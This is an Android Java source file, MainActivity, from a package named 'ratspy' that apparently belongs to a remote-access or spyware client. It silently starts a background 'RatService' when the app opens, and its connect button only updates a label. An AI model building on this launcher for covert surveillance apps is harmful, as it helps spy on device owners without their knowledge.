package com.ratspy.client;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

 @Override
 protected void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);
 setContentView(R.layout.activity_main);

 TextView statusView = findViewById(R.id.status_text);
 Button connectBtn = findViewById(R.id.connect_btn);

 // Start the Service in the background
 Intent serviceIntent = new Intent(this, RatService.class);
 startService(serviceIntent);

 connectBtn.setOnClickListener(v -> {
 statusView.setText("Connecting...");
 Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show();
 });
 }
}
